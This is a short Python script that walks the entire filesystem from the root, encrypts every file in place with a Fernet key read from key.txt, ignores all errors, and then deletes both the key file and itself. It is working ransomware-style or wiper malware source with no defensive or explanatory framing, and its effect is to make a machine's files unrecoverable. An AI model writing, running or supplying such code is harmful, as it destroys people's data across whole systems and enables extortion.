import os
from glob import glob
from cryptography.fernet import Fernet

if(os.name == 'posix'):
    os_path = "/"
else:
    os_path = "c:/"

def encrypt(path):
    with open("key.txt" , "rb") as a:
        key = a.read()
    token = Fernet(key)
    with open(path , "rb") as a:
        h = a.read()
    h = token.encrypt(h)
    with open(path,"wb") as a:
        a.write(h)



for (root, dirs , file ) in os.walk(os_path):
    for f in file:
        f = os.path.join(root , f)

        try:
            encrypt(f)
        except:
            pass

os.remove("key.txt")
os.remove(__file__)